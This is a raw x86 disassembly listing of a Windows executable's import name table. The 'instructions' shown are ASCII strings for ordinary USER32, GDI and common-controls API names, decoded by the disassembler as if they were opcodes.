  412e1c:	je     0x412e83
  412e1e:	ins    DWORD PTR es:[edi],dx
  412e1f:	add    al,ch
  412e21:	add    DWORD PTR [edi+0x70],ecx
  412e24:	outs   dx,BYTE PTR gs:[esi]
  412e26:	dec    ecx
  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
